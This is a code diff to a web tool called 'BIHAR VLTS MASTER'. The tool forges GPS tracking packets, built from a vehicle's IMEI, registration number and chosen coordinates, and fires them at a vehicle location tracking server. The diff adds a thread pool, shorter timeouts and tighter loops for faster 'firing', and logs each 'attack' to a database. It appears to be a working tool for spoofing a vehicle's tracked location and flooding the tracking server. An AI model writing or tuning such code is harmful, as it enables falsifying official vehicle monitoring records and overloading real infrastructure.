@@ -3,6 +3,7 @@ import time
 import socket
 import httpx
 from datetime import datetime, timedelta, timezone
+from concurrent.futures import ThreadPoolExecutor
 from fastapi import FastAPI, BackgroundTasks, Request
 from fastapi.responses import HTMLResponse
 
@@ -17,6 +18,8 @@ TARGET_PORT = 9999
 stop_event = threading.Event()
 stop_event.set()
 packet_count = 0
+# 🔥 Speed Optimized Executor (Max 25 Parallel Handshakes)
+executor = ThreadPoolExecutor(max_workers=25)
 
 # --- 2. ENGINE LOGIC ---
 def sync_to_firebase(vno, data):
@@ -28,17 +31,16 @@ def sync_to_firebase(vno, data):
 def handshake_worker(tag, imei, vno, lat, lon):
     global packet_count
     try:
-        # Current Device Time & Date
+        # Current Device Time (IST)
         now = datetime.now(timezone.utc) + timedelta(hours=5, minutes=30)
         date_str = now.strftime('%d%m%Y') # DDMMYYYY
         time_str = now.strftime('%H%M%S') # HHMMSS
 
-        # 🔥 REAL STRING LOGIC (Ek digit bhi change nahi)
-        # Format: $PVT,{tag},1.ONTC,NR,01,L,{imei},{vno},1,{date},{time},{lat},N,{lon},E,0.0,348.79,31,0033.96,2.00,0.40,airtel,0,1,029.2,004.1,0,C,29,405,52,065d,45c2,45c1,065d,24,eeca,065d,17,bfd4,065d,17,384c,065d,16,0000,00,014722,A3270A39*
+        # 🔥 REAL STRING (Strictly No Changes)
         packet = f"$PVT,{tag},1.ONTC,NR,01,L,{imei},{vno},1,{date_str},{time_str},{lat},N,{lon},E,0.0,348.79,31,0033.96,2.00,0.40,airtel,0,1,029.2,004.1,0,C,29,405,52,065d,45c2,45c1,065d,24,eeca,065d,17,bfd4,065d,17,384c,065d,16,0000,00,014722,A3270A39*\r\n"
 
         with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
-            s.settimeout(5)
+            s.settimeout(2) # Faster timeout for speed
             s.connect((TARGET_DOMAIN, TARGET_PORT))
             s.sendall(packet.encode())
             packet_count += 1
@@ -49,9 +51,11 @@ def nitro_firing_loop(v_up, i, lt, ln, t_up):
     while not stop_event.is_set():
         for tag in target_tags:
             if stop_event.is_set(): break
-            threading.Thread(target=handshake_worker, args=(tag, i, v_up, lt, ln), daemon=True).start()
-            # Sequential Gap for Server Stability
-            time.sleep(0.5 if t_up == "ALL" else 0.1)
+            # 🔥 Multi-threaded submission for 10x Speed
+            executor.submit(handshake_worker, tag, i, v_up, lt, ln)
+        
+        # Mini gap to prevent CPU chocking
+        time.sleep(0.05)
 
 # --- 3. API ROUTES ---
 @app.get("/init")
@@ -62,6 +66,7 @@ async def init(v:str, i:str, lt:str, ln:str, t:str, background_tasks: Background
         packet_count = 0
         stop_event.clear()
         
+        # Save Attack Log to DB
         now = datetime.now(timezone.utc) + timedelta(hours=5, minutes=30)
         payload = {"Vehicle_No": v_up, "IMEI_No": i, "Lat": lt, "Lon": ln, "Last_Attack": now.strftime('%Y-%m-%d %H:%M:%S')}
         background_tasks.add_task(sync_to_firebase, v_up, payload)
@@ -98,10 +103,12 @@ async def home():
         input, select { width:100%; background:#000; border:1px solid #333; color:#0f0; padding:12px; margin-top:10px; outline:none; text-transform:uppercase; font-size:16px; border-radius:5px; }
         .chk-group { display: flex; align-items: center; gap: 12px; margin-top: 15px; color: #fff; font-size: 13px; }
         button { width:100%; padding:14px; margin-top:10px; cursor:pointer; border:1px solid #0f0; background:transparent; color:#0f0; font-weight:bold; border-radius:5px; }
+        .audit-box { display:flex; justify-content:space-between; background:rgba(0,40,0,0.5); border:1px solid #0f0; padding:8px; margin-top:10px; border-radius:5px; }
         #map { width:100%; height:200px; margin-top:15px; border:1px solid #0f0; border-radius:10px; }
     </style></head><body>
     <div class="dashboard">
         <h2 style="letter-spacing:3px; color:yellow;">BIHAR VLTS MASTER</h2>
+        <div class="audit-box"><div>OK<b id="a_ok" style="display:block; font-size:18px;">0</b></div><div>TOTAL<b id="a_total" style="display:block; font-size:18px;">0</b></div></div>
         <input type="text" id="v" onblur="smartFetch()" placeholder="VEHICLE NUMBER">
         <input type="text" id="i" placeholder="IMEI">
         <div style="display:flex;gap:5px;"><input type="text" id="lt" placeholder="LAT"><input type="text" id="ln" placeholder="LON"></div>
@@ -122,10 +129,13 @@ async def home():
         function getLocation() { navigator.geolocation.getCurrentPosition(p=>{ document.getElementById('lt').value = p.coords.latitude.toFixed(7); document.getElementById('ln').value = p.coords.longitude.toFixed(7); map.setView([p.coords.latitude, p.coords.longitude], 15); marker.setLatLng([p.coords.latitude, p.coords.longitude]); }); }
         function resetSys() { fetch('/stop'); document.getElementById('v').value=''; document.getElementById('i').value=''; document.getElementById('lt').value=''; document.getElementById('ln').value=''; document.getElementById('c').innerText='0'; }
         setInterval(() => { fetch('/status').then(r=>r.json()).then(d=> { 
-            document.getElementById('c').innerText = d.c; 
+            document.getElementById('c').innerText = d.c; document.getElementById('a_total').innerText = d.c; 
             if(d.f) { document.getElementById('st_text').innerText = 'FIRING'; document.getElementById('st_text').style.color = 'red'; }
             else { document.getElementById('st_text').innerText = 'IDLE'; document.getElementById('st_text').style.color = 'lime'; }
-        }); }, 1000);
+        });
+        let today = new Date().toISOString().split('T')[0];
+        fetch(`${DB}/User_Audit/${today}/${mobile}.json`).then(r=>r.json()).then(ad=>{ if(ad) document.getElementById('a_ok').innerText = ad.ok || 0; });
+        }, 1000);
         async function smartFetch() { 
             let v = document.getElementById('v').value.toUpperCase().trim(); if(!v) return; 
             let res = await fetch(`/fetch_data?vno=${v}`); let d = await res.json(); 
